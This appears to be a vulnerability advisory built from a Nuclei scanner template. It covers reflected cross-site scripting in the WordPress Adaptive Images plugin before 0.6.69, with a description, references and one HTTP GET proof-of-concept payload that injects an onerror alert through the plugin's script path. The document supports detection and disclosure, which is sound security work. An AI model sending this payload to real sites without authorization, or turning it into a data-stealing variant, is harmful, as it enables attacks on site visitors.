# Nuclei Template: WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
**Template ID:** wp-adaptive-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-adaptive-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true
```

## References
- https://wpscan.com/vulnerability/eef137af-408c-481c-8493-afe6ee2105d0
- https://plugins.trac.wordpress.org/changeset/2655683
